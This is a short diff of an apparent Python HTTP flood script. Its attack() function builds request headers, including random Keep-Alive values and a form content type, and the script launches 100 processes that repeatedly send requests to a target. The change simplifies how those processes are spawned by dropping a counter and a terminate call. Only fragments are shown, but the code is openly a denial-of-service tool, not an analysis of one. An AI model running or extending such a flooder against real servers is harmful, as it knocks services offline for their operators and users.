@@ -19,7 +19,6 @@ connection = ("Keep-Alive", random.randint(110,160))
 content    = "Content-Type: application/x-www-form-urlencoded\r\n"
 length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
 num_sent = 0
-l=100
 go = threading.Event()
 def attack():
     global num_sent, useragents, acceptall, ref, connection, content, length
@@ -38,10 +37,8 @@ def attack():
                 x.send(str.encode(request))
         except:
             x.close()
-            l=l+1
-            th.terminate()
 
-for y in range(l):
+for y in range(100):
     th = multiprocessing.Process (target=attack)
     go.set()
     th.start()
